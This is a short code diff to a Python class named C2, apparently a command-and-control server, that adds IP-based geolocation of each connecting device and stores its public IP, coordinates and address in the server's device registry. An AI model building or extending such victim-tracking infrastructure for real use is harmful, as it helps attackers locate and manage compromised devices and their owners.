@@ -49,7 +49,23 @@ class C2:
 
         print(f"IP: {client_ip}")
 
-        print(f"New device connected with sid {sid}")
+        try:
+            geo = geocoder.ip(client_ip)
+            geolocation = {
+                'latitude': geo.latlng[0],
+                'longitude': geo.latlng[1],
+                'address': geo.address
+            }
+        except:
+            geolocation = {
+                'latitude': 'Unknown',
+                'longitude': 'Unknown',
+                'address': 'Unknown'
+            }
+
+        data['public_ip'] = client_ip
+        data['geolocation'] = geolocation
+
         if data['uuid'] not in self.devices:
             data['sid'] = sid
             self.devices.update({data['uuid']: data})
